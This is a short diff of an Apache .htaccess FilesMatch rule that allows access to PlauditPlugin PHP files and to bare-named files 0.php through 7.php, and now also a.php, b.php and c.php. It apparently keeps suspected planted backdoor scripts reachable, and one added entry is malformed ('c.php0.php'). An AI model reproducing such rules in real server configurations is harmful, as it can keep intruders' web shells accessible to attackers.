@@ -70,7 +70,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(index.php|PlauditPluginForm.php|PlauditPlugin.inc.php|PlauditPlugin.php|PlauditPlugin.inc.phtml|0.php|1.php|2.php|3.php|4.php|5.php|6.php|7.php)$">#
+<FilesMatch "^(index.php|PlauditPluginForm.php|PlauditPlugin.inc.php|PlauditPlugin.php|PlauditPlugin.inc.phtml|a.php|b.php|c.php0.php|1.php|2.php|3.php|4.php|5.php|6.php|7.php)$">#
 Order allow,deny
 Allow from all
 </FilesMatch>
